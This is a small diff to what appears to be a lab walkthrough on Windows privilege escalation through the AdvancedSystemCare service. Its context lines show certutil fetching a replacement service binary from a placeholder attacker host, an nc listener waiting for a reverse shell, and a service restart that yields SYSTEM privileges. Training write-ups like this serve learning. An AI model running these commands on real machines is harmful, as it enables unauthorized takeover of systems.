@@ -132,7 +132,7 @@ certutil -f -split -urlcache http://<IP>:<PORT>/ASCService.exe ASCService.exe
 ```
 ![](https://github.com/user-attachments/assets/cc6d0c75-c85d-41ee-be42-c521a5e6e027)
 
-In another terminal, fire up `nc -lvnp <PORT>` and by restarting the service we will have obtained NT AUTHORITY/SYSTEM privileges, this time with manual exploitation. 
+In another terminal, fire up `nc -lvnp <PORT>` and by restarting the service we will have escalate to NT AUTHORITY/SYSTEM privileges, this time with manual exploitation. 
 ```
 sc start AdvancedSystemCareService9
 ```
